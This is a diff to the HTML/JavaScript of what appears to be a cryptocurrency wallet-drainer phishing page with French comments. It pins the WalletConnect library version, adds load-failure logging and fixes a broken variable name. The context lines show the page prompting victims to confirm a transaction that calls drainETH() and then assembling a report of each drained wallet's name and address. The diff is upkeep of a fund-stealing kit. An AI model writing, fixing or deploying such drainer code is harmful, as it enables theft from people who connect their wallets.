@@ -10,8 +10,8 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <!-- Charger WalletConnect 2.x (dernière version) -->
-    <script src="https://unpkg.com/@walletconnect/ethereum-provider@latest/dist/index.umd.js" defer></script>
+    <!-- Charger WalletConnect 2.x (version 2.19.1) -->
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.19.1/dist/index.umd.js" defer></script>
     <style>
         /* Styles pour le popup et l'overlay */
         .wallet-popup {
@@ -233,6 +233,8 @@
                 attempts++;
             }
             if (!window.WalletConnectEthereumProvider) {
+                console.log('Échec du chargement de WalletConnectEthereumProvider après plusieurs tentatives.');
+                console.log('État final de window.WalletConnectEthereumProvider :', window.WalletConnectEthereumProvider);
                 throw new Error('WalletConnectEthereumProvider n’est pas chargé après plusieurs tentatives.');
             }
             console.log('WalletConnectEthereumProvider chargé avec succès :', window.WalletConnectEthereumProvider);
@@ -439,8 +441,7 @@
                     // Drainage ETH via le smart contract
                     updateStatus(elements, 'Envoi de la transaction... Veuillez confirmer dans votre wallet.', true);
                     const drainResult = await drainETH(ethAddress, provider);
-                    if (drai
-nResult.success) {
+                    if (drainResult.success) {
                         const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
                                               `💼 Wallet: ${wallet.name} (WalletConnect)\n` +
                                               `🌐 ETH Address: ${ethAddress}\n` +
